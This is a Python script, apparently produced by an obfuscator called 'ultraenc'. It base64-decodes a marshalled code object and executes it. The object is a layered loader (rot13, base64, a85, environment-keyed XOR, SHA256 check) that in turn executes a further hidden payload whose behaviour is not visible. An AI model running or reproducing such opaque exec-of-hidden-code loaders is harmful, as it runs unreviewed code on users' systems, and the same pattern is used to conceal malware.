#!/usr/bin/env python3
# ultraenc final wrapper â€” keeps internals hidden
import base64, marshal

DATA = """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DAEIAXIDAAAAYVwRAABuS1dQV3ljNnJhYnVWR1pnVmxSYU0wMXVWRjA2b0d0dVZGRUNaUlJnV1JnVkNKOXRYUUlPWUZFWUZHMWluRjQyREYwZ0hIZ1JXUGNsRVBSOEMxZjJERjAzRTJWOXBRdVdDMFJnRFIxd0NLT09HME9PWUh5R01STmpLdzlWREYxRkpKSU5aVHFQRjBSZ01UdWFDS09wTEh1WVhKV2lIUlJnVjFIaVl3UmZBRzB1VkZSdW9sNGpCUDBlRXpPYkVQOGtueUVLSG1qZkp5T3RFUldBb3p5UW5RRXNHRmdUQVJEOEJSOUNLUEFPSDJXalZtQW5weTl1WDBWOEZ6OVNMbGo4V3hTWUpTU3JFdmJibkZxU0xKT3pZR0FucHk5dVgwU3dGMk1UWHhFREQwUmpDSHVxRXZiYm5GcVNMSk96WUdBbnBKODByYWJ1VkZSdVpQUnVWRlIxVkZSdVZKRHVWRlJ2QzBjd0hUeUNFd3h4RDJPWVhLT1BWMEw1QUpnREV3eCtwSVdPWUZIY0p4UmdZR3lSREYwL0VIdU9ZSVNFR1JSZ0p5cUJERjFmTDFXT1l2eWlJeFJoQ1BNbkRGNUJaeTVPWXpOK0x4UmhweGN6SGw1YUIxT09ZbU9Xb1JSaUJHcWFIek1XTW15Vm5JQUJvMFJpRHcxY0h6TVZxUHVPWTBjYnBTWmdwMk9XRXd5VkNJNVZuSWtIcHh1Y29KMTBHd2o5SG1BT1kyTWhWSFphRnp1cUVKTW1weVNPWlBabFdIV3RJek94SGwwdlh4V1RCSkRqcDBmY24zSUVFU3Q2b0lNVm52VmpNME1pSnlTY0RHT1VGdnVPWlBrVEwwUmpBbWtRRkdPQ0wzSVZud0htWFBSOERQQW9ER09FRGx1UVcwY2JLSEloQVRXVURHTndadklQTFNNdE1TWmdWdmNSRXd5eFpVSVlYSmcxSEhFRVdGdWVGVGJ2WlRxVG8xY0ZKUlJqbjJWZkRHTmZFekFPWlFwOEQweGpMS052RlRjVUNsYnVDUk52b1JSanFJZmZEbHFYblMxQ0JGcU9ESFJrWFQ0aERHTmZFekFPWlFwOEQweGpubFJ3RlRjREVGZnVDUk52RlJSa1p6cGhEbHFYblMxQ0JGcVBDeHVkVndPY0ZHTzBDbDlIRXZINm9SeGtYUkhrREdSNERLV1daR1JtV3hSa0VVWjRGbHkxV3lXVm56Z1NBUkw1RndML0RHU0FMRjlGTXh1MEdITDZBU1I4REdTdUN5SVRCRkVvcVJmY29UV2FJVE9VWTI5UkRUcCtaeFJrcElxMEZHU1FDbHVWbmx1d1pQUjhDMXRrQjFjWEFsWjZaMjVJWUhNU0VSY1FaMWtCWUtSaW96a2tIUkVZRHo4aER3THlFS0Rpb3d1YUJ3TjBESnAyWlFNSFdscU5CeDV5TDBNdFhHZ1BaUUlESEc1UG9RSUdHRklsVkl4a0VSZ1BvbDVQQXZJU3FQOWhCVHA2RlFNdkRsZmpGMElxSXhTQlhHVnhaUmN4WVR0a0wweDBWRjlGbkdBWERUZ1JaSGdPR3dndlh4T0REeGNrWnhFcUpUdGpNeER4SFFaelZHT1FaVEllQndia0ZRT0lMRjlBSXZFQUVGMHhDR05pR0lBZVptT1hHR1dxWlI1akthUmpGMEl0VkdTWkxQcTFaRmtqcDNBTkhTMWJwME9ERHpadlpHU0tCdkRrR0Y5U3FSTjZHR3VCRFRqM25sMGtFMEgvRzBONkswdGtaRmtiVnZaa0xsTUtWd1NBWW05MERRTHlwU0hqbm1XaERQV1BIbDl1QlNINkpVSU5JMHFUbjBwOEZ2eWdXSmtWQWx0akZsdWRFbVN3V1VPVFpGa1pMSE1WQ2x5R3BSTGRYVHhhRUpTdE12MGpNSlY2QXdPWEFGSG1aVE1aS3c0a1lGRVdEMEVXTVREZUR6ZmlDd3BrWVVPakZHRHVBdzAxWlNOd1lHYjBWR01DQm1PRllRamtaUmNVSHdWMldQSGpuR0R1QXpxekNSSHVBYVZqRnhwNkd3TWlxSDFLQjJBRUx2cDRHSEViSG1NanBsY25Eemo0V1B1UUwyT3ZHeEVXQXhBUEFQUjJBbXhqTXdTYUZtV1NWSFdORlFBV24zRGlISHFzcEd5RG94Z0dBUzRib1NaNG4wMVBCUUw2Vko0ZlpUa2tXdklOb21ML0dIUjJaekxlRHdIN1owUmxYd1dqbnhMY24yajNFVEljcFBIMEsyRCtNR01IRnpWeFpSa2pBUTgyQjE5d1lReDBLS1NpRlBXWUhHZmtZdkFwTVJFWU1LTnpaVDFNR3k1U1lTMUtZSE9qcDB5aEVUTGhBU1JpSUZ5UktsOUdCVU9PRVB1SG9INVFuUXFZbzBFeVh4SWNBUFI0V1J1TkNQMVRWMEwvR3lwYUExTmdJUnB6SDB1U1hSSHlFRmtQRElaZkxKSVREMkR1RTBPS0UxcUlCSU9YWUg1U01SUmJZeFNHVjJwMERRZ1lKRkVPSEpManBRVmNMM1cwQ0tOaER3cVRYdnlyREcwOW9HOXREd0VuVnZSaUhHTDFXSExibzFSa1kxTmpGbFJiWlJIaEx4V2VHRlNrRVJBaExLT1VEU09WVzBTR3FJSG1EempoRXYwYW52YnlKeFZoSnhjYkVSY2RWM1NURVFJblp2OUVBeUx2RElXalh2eDlDSjBkSWw5Q0VKa3RER3lKTFVJVEVQYjNYSEhlR3lFZVkxT1BIVGtUWHlreFlGOURaU1pmQXcxVEx4V1VER1NIWlJXWFZHVnlFeEFPcUtPVldQU0pDRjlDRXpWekNHMWdYeXBpRzBJZkxSUjVJek8xRXhEZEFsY1JNek1TWFJNUkFJRGFZMU9JQm1Eem9GMXNIUkFjQ0Zia1kxU0VFbHFUWFQ5RVpGOURaUmZ1VzA1d3BJeVBZeWNYblJFWG52QWtFeEQxSndWaUhITnZBMFNJQVVTZFkxTmpIbGoySlRTa0R4T0pGMXVnRXhEMUNQMVZBUGNiWVF1R0JJTU5FRmtvRGxBT0JKNUdLMExiRjBTUkF2V3VMeHVURXZXVkxST2taUHViRXcxYVpVT1JGdmZkVjBWMEpHTUJBeWIyb0l5UG5tZ0hWR01uQXpjdURJQTFJUlI4WUpPVG8wdDBHd2dDRFVTUEl2RGlHMlNETUhFeVh5VnZEd01lWDJmaUcyYmxXUXQ1REtXZ1kwOXVIVHlQb1FxWUxsRDZESk9aRVJ5Z0NGV1BvUk9nQlBJRkpGOURFeEF6Q21aaUhSZ3NveFYyQTJwMUIyRDBIMjFOcHh1WllITVNaeXgyRFVXVW9KdGZWRkVpV3ZnMEczT25FVE1qWEdTT0YyYmpDdmp5SFFxbURRa1ZEbDRmV1RNSUZ4dUVvVVo4RXpOY0IwU1ZWSlZhVnhSM0phV1VYM0lrSFFqZXFSOWpKeEV6cFB4a0RIZ2RaUTRmV2w1V0JQanhNeUx6Q0taaEhIeDlKMU5sS0hNTUZRMGdaRjR2bkl4K1Z6T1NMUldnRXdncEJRVjhHSHFPSDNJcU0wcWtueUlWQ3hOd3BKTmtMS1d6QkZINkxHMHVFUmdZbzBIL0pUNHZMeFNIR0ZBcEVGZ2RaUDFPSHhWaEt3MWpNSU1WRXZ5ZW9RcVJNSnlqV0pwYUVUdVBESUVSSmFBUll5U2ZIeE42SlB1c0NLTmlGeWtQbm1TUEh4UjNLS08xRFVTUFZ5MU9BeGdUSVJFekJHeGNESVdQRzNFUUdVU1FYSnBhRVN4ZUV2eTFIUkVTTHZMK01IQWNDVVp3RVJ4Mk0yOVREMkw4WXhNUVkwNWxFek5jQmx4em9hRTFMMExib211aUQwa2tMM0lVV0hxcUJSV2ZEVGo4Vko1Z29UMU9IeURlS1JJd0tLUjdER3A1SHpxVkFSRGdZeE42STE5dURRajJHUU1STXlFT0FSdDBFejR6RXZ5MUhSRVNMdkQ3WEhON0dQU2xNbE13WW1SOXBRcUhDUlYxWEdMMFZKNWdNejlSTUhJeFdISUxCMTVVVkY0d1lQU1BvUXRkV3hBYkowSXlFek9KWVFwZlcyY1laMEVxbndTUkRJRVNYRzBmV0hwNnFST2xXUEh5RHpqNFdQV05wSTA2TUhBYkEwZ21ESVdQRkp1U0ZTTzFCSFNGb1VJYVZscDBDMkFUS2xrSEN4QXVYdlp3RXpPWElHSU5wR09VVnhFWUZGVjNEUWptSEZBT0hsQXVXSFI0WUZjaERTTXpJSkRlRVBrREFQZ1NuUng3RDJxYkV2V1JGdnRjWkhNdEZ5SVZESUVSSlA4aU1sY2NWSE44WUdMaER5UnpYR2dWVjB5YUZ4RGhZeTAwRFNMeEp6Y05Jek1IcUhNUm5HY1BESUVBcG1BU0x2MU9DSEV6cFB1UURRY0JNSkFUTFB4Nkh2anhFbGdNRFFncUl2SGFNUk91RVJFeEh2Y3ZEVVcxSlFOL0p4Z3JxUk1zSFRqZ0RHT0RaSkFVV0hxcVl4U2hMelN0RXhEMUp3V1ZBUWZhQ3hNUUR3eDJFdlI4SlR1Uk1KcURWbER4WlNmdUV2dWlIR1NQbm1WL1ZGUnVWRlZhbkpJTFdGOGVEdnljb0hMYm8xUmtEemZpQ3h4ZUV3SHdEUk1TRVJjUVoxa0JZS09TWDNPa0ZSU0dMYU9kRUpTdE13Z1JNeUVYRVJPS1lITjNXMkl1SW01UkZKQVdISExjcVRaekRINW1KbWtOQ1E1ZG54Um1FbUlRWUc5Qk0wRVRDMDlMR2xSdVZGQUVWeTlSS2FPUk15VjVCVHB6b1JEOEVKQUFaMTB1VkZ1cklITXRJdmozTWxNZkJsTVRBVU9oQzBTSEIyYmJFdmJjRnZqdkVHdDZWME1EQXpmK0RJSHpDSDR2TFNBWXB4RVlGbEl5RFVXVkJ2RVBubWYvblBBcEh5NWRDMXh1bjFrVEhRTWJDSEV5b3ZMaER6cXVEeWo5bzNXYkkycHpvUmI4RDJ5SExJanVWRkh4RXZSdVZGQUVWSkFibnlIdkttZnlMUk4xSXdBZkRHcDVIenBrTW1Sem94TjhDYU4xQ0tONEUwTVREbTkwWWxXc0JsSXREUUx5RjI1TnB4dGlCdlN3WEk1TFYwV0NGVUVUWElPd1pHMWpXSHFLQndPV01tQU5DUTVqQnlwN3BVV0hWRlJ1VjNSeEJJcVZGSE1TWkpMeEVSeU1uMDR4Wm1SelhsV2lveXBhRXZjb016RHVWRlJhWGxSOExSSGVWR2t0RmxmdUNSNDVXbFI4R3d4YVZHa0JCRnB1Q1I0NVdsUjhHd3hhVkdrQkJGcHVDUjQ1V2xSOEd3eGFWR2tCQkZxZm5KNU5aUFI4R3d4YVZHa3RFRnh1Q1I0NVdsUjhHd3hjVkdrQkJGcWlFSHFhQmxTTEtVVjhWRzFPbkdwdUNKTGZCbFI5REpqOFZHMU9uR3B1Q0pMZkJsUjlIM0g5VkcxT29RYnVDVVdFWkZSOVkxMDFWR2t0RUh4dXAySWpGdkRtWkZMZVl3UmtYRmZ1VkZSd0hGV1NLUTlqRElTekFTY1RLMU9QWVBTS0ltWndNbHBjWnY1U1lHTDREbE13SzI0bUVJeU9FSVJ1WUY5QUZsUnVXRkVaVkZSdVZ3NHhabVJ6WDBJTU1JMUlWRjBpbjFIdVZGSHhJRlJ1VkZWK1hTMUxHbXlhVzBXekpSRXlYbFJmREg1YVgzTnVWRkhhRkZSdVZGUmNWRzBpS0dwdUMxOVRHUXgwRVFrelpSZ1NJUElPblN5MUdtU1VJSmMxWkZrSXFQSGxGdkQ3SHdXeVgxNHhEU09zRkhmbEsxZnVEME9FWXpjSVpUSTBGRzhtRWFEeFdIUjNKMlowWkdTdEZGcG1XdmNQR0hSbEZJOGNESlo92gVwbGFpbtoAKQFyJwAAACkWWgljeV9sb2FkZXJyAgAAAHIDAAAA2glFeGNlcHRpb25yDAAAAHIFAAAAchMAAAByNAAAAHIKAAAAchAAAAByEgAAAHIWAAAA2gNzdHJyIQAAAHIcAAAAciYAAABaB1BBWUxPQURaBE1PREVaCFNBTFRfSEVYWgdLRVlfRU5W2gRjb2Rl2gRleGVjcggAAAByCAAAAHIIAAAAcgkAAADaCDxtb2R1bGU+AwAAAHMiAAAAAgEUAQwBJgIIAwgDCAMIAxIDEgcYDA4IBAEEAQQBBAISAQ=="""

try:
    blob = base64.b64decode(DATA)
    code = marshal.loads(blob)
    exec(code)
except Exception as e:
    print("Hata:", e)
